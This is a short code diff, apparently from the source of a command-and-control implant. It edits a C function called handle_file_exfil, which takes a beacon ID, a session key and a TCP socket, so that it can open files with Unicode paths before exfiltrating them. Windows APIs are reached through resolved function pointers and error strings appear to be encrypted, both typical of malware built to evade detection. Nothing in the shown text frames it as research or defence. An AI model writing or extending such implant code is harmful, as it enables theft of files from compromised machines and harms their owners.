@@ -127,7 +127,9 @@ void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                        const char *src_path,
                        const uint8_t session_key[32],
                        SOCKET tcp_sock) {
-    HANDLE hFile = fnCreateFileA2(src_path, GENERIC_READ, FILE_SHARE_READ, NULL,
+    wchar_t wsrc[MAX_PATH];
+    fnMultiByteToWideChar(CP_UTF8, 0, src_path, -1, wsrc, MAX_PATH);
+    HANDLE hFile = fnCreateFileW2(wsrc, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         char _err[ENC_EXFIL_ERR_OPEN_LEN + 1];
